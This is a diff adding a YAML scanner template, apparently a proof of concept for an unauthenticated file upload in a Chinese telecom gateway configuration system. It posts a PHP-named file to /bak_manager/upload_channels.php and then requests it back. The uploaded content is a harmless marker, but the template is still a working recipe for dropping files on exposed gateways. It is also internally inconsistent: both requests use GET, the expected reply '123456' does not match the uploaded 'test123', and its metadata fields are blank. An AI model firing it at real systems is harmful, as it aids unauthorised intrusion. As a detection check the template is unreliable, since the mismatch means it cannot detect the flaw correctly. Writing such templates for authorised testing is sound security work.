@@ -1,0 +1,30 @@
+id:
+
+info:
+  name: 电信网关配置管理系统 upload_channels.php 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /bak_manager/upload_channels.php
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+    Accept-Encoding: gzip
+  data: |
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="file"; filename="test1.php"
+    Content-Type: text/plain
+
+    test123
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+response1:
+requests2:
+  method: GET
+  path: /bak_manager/test1.php
+response2:
+  body: 123456
+  code: 200
